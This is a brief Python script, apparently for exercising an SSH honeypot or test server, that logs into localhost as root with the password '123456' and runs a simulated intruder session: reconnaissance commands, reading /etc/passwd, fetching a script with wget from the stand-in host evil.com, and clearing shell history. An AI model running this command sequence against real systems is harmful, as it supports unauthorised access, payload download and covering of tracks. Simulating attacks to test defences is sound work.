import asyncio, asyncssh
async def main():
    async with asyncssh.connect("localhost", 2222, username="root", password="123456", known_hosts=None) as c:
        for cmd in ["whoami", "uname -a", "cat /etc/passwd", "wget http://evil.com/x.sh", "history -c"]:
            r = await c.run(cmd)
            print(f"$ {cmd}\n{r.stdout}")
asyncio.run(main())
